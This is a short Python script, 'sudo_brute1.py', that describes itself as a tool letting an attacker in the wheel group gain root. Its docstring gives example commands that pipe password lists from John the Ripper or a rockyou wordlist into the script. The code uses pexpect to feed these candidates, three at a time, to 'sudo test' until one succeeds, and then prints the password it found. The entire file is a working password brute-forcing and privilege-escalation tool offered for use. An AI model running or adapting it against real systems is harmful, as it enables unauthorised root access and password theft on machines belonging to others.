#!/usr/bin/env python

"""
sudo_brute1.py
by Javantea
Aug 10, 2010

Sudo Bruteforce Utility version 0.1
Allows an attacker with wheel access to gain root priviledges using a 
dictionary or bruteforce attack provided by pipe.
For example:
./john --stdout --incremental | python sudo_brute1.py
python sudo_brute1.py < rockyou1_order.txt
"""

import pexpect
from sys import stdin



password_test3 = '#'
while password_test3:
	print "reading from stdin"
	password_test1 = stdin.readline().strip()
	password_test2 = stdin.readline().strip()
	password_test3 = stdin.readline().strip()
	print password_test1 
	print password_test2 
	print password_test3
	child = pexpect.spawn('sudo test')
	print child 
	# patch here 
	child.expect('Password:') 
	child.sendline(password_test1)
	data  = child.readline()
	data += child.readline()
	failure1 = ('Sorry, try again.' in data)
	print 'data0a:', data
	child.expect('Password:')
	child.sendline(password_test2)
	data  = child.readline()
	data += child.readline()
	failure2 = ('Sorry, try again.' in data)
	print 'data0b:', data
	child.expect('Password:')
	child.sendline(password_test3)
	data  = child.readline()
	data += child.readline()
	failure3 = ('Sorry, try again.' in data)
	child.close()
	print 'data1:', data
	failure = failure1 and failure2 and failure3
	if not failure:
		print 'data2:', repr(data)
		if 'Permission denied' in data:
			print 'You are not in sudoers, sorry.'
			break
		#end if
		print "password found:", password_test1, password_test2, password_test3
		break
	#end if
#loop

